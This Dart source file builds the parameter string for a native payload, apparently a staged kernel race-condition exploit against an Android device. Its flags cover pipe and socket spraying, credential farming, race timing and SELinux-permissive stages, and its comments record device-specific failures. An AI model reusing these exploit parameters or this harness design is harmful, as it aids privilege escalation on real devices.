/// x645（原生载荷）的 env 串构造。
///
/// 单独一个文件是为了**可单测**：这是纯字符串逻辑，拼错了只会在真机上暴露
/// （例如漏 `P645_LEFT` ⇒ permissive 阶段「判据通过但内核零写入」，见 CHANGELOG
/// 「未发布 — BKQ-AN10 适配修复」），而 CI 的 build 检查看不出来。
///
/// 用法：`permissive` 与后续 stage 都必须走这一个函数，不要再手抄第二份。
library;

/// x645「竞速参数」公共串：`permissive` 与后续 stage 必须**逐字一致**。
///
/// [extra] 插在 `P645_RING_GO` 之后、`P645_PRE_PIPES` 之前，**需自带结尾空格**
/// —— 拼少了会粘成 `P645_RING_GO=0P645_X=1`，载荷的 `getenv` 直接读不到这个键。
String x645StageEnv({
  required int stageFrom,
  required int stageTo,
  required int tries,
  required int prePipes,
  required String logPath,
  String extra = '',
}) =>
    'P645_STAGE=1 P645_STAGE_FROM=$stageFrom P645_STAGE_TO=$stageTo '
    'P645_STAGE_TRIES=$tries P645_ATTEMPTS=1 P645_KIDS=0 P645_CRED_FARM=0 '
    'P645_DRAIN_AFTER=0 P645_THREAD_FILL=0 P645_FILL_SELF=0 '
    'P645_LEAK_FORK=0 P645_FORK_AFTER=0 P645_PRE_UM_MB=0 P645_TIMERS=54000 '
    'P645_REPEATS=520 P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 '
    'P645_FREEZE=1 P645_V8=1 P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 '
    'P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 P645_MODE=4 P645_ANON2_MB=1024 '
    'P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 P645_THRESH=32 '
    'P645_RING_GO=0 $extra'
    // PRE_PIPES 决定 uid 2000 的 64MB 管道预算用得早不早：
    // 20000 会把预算占满 ⇒ 后面 PIPE512=64 的 512KB 管道必然 EPERM（实测 errno=1）。
    'P645_PRE_PIPES=$prePipes P645_LOG=$logPath';
